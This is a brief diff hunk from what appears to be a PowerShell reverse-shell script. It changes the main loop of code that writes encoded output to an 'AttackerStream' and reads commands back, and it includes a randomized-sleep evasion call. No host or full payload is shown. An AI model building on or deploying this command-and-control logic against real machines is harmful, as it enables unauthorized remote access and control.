@@ -96,7 +96,7 @@ $Packet                                 = [Byte] (Application-ify $EncodedOutput
 $BytesWritten                           = $AttackerStream.Write($Packet, 0, $Packet.Length)
 $BytesRead                              = $AttackerStream.Read($Buffer, 0, $Buffer.Length)
 
-while ($Attacker.Connected)
+while ($BytesRead)
 {
     Sleep-Random
 
